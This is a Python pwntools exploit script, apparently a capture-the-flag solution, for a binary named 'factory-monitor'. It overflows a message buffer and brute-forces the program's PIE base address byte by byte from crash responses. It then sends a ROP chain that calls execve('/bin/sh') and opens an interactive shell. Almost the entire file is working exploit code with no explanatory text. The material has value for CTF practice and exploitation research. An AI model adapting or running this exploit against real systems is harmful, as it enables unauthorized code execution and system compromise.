#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './factory-monitor'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
# ============================EXPLOIT============================
# cmds
def create(name):
    sla(b'factory> ', b"create " + name)
def start(id):
    sla(b'factory> ', f"start {id}".encode())
def stop(id):
    sla(b'factory> ', f"stop {id}".encode())
def monitor(id):
    sla(b'factory> ', f"monitor {id}".encode())
def cleanup(id):
    sla(b'factory> ', f"cleanup {id}".encode())
def deinit(id):
    sla(b'factory> ', f"deinit {id}".encode())
def send(id, msg):
    sla(b'factory> ', f"send {id} ".encode() + msg)
def recv(id, timeout=b""):
    cmd = f"recv {id}".encode()
    if timeout:
        cmd += b" " + timeout
    sla(b'factory> ', cmd)

# payload

def check(target, choice):
    test = bytes(target + [choice])
    payload = b'B' * 0x118 + test
    if b'\n' in payload:
        return None
    send(0, payload)
    send(0, b'fail')
    time.sleep(0.5)
    monitor(0)
    resp = p.recvuntil(b'factory> ', timeout=5)
    correct = b'exited with status' in resp or b'exited successfully' in resp
    if b'Restarting' in resp or b'exited successfully' in resp:
        if b'exited successfully' in resp:
            sl(b'start 0')
            rcu(b'factory> ')
        sl(b'recv 0 1000')
    return correct

def brute_force():
    log.info("=== BRUTE FORCE ===")
    create(b"A"*8)
    start(0)
    recv(0, b'1000') # clean pipe
    
    target = [0x57]
    
    for pos in range(1, 6):
        if pos == 1:
            choices = [(n*16 + 0xb4) & 0xff for n in range(16)]
        elif pos == 5:
            choices = list(range(0x70, 0x80)) + list(range(0, 0x70))
        else:
            choices = list(range(256))
            
        choices = [c for c in choices if c != 0x0a]
        log.info(f"byte {pos + 1}...")
        
        for choice in choices:
            if check(target, choice):
                target.append(choice)
                log.success(f"-> byte {pos + 1} = 0x{choice:02x}")
                break
        else:
            log.error("failed")    
            sys.exit(1)
            
    pie_base = u64(bytes(target) + b'\x00'*2) - 0xb457
    log.success(f"BINARY BASE: {hex(pie_base)}")
    return pie_base

def execv():
    log.info("=== ROP ===")
    # gadgets 
    syscall = 0x00000000000097f9 + exe.address
    pop_rdi_rbp = 0x000000000000c028 + exe.address
    pop_rsi_rbp = 0x0000000000015b26 + exe.address
    pop_rdx = 0x00000000000836dc + exe.address # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    pop_rax = 0x0000000000040dcb + exe.address
    machine_addr = 0xc5a20 + exe.address
    name = b'/bin/sh\x00'
    if args.GDB:
        gdbscript = f'''
        set follow-fork-mode child
        b*fork+73
        b*main+1022
        continue
        '''
        gdb.attach(p, gdbscript=gdbscript)
        input("=== enter to continue ===")
        time.sleep(1)
    create(name)
    start(1)
    recv(1, b'1000')
    
    payload = flat(
        pop_rdi_rbp, p64(machine_addr+0x48), p64(0x0),
        pop_rsi_rbp, p64(0x0), p64(0x0),
        pop_rdx, p64(0x0), p64(0x0)*4,
        pop_rax, 0x3b,
        syscall
    )

    sl(b'send 1 fail\x00' + b'A'*275 + payload + b'\nrecv 1 1000\nrecv 1 9999999')
    time.sleep(0.5)

exe.address = brute_force()
execv()

p.interactive()
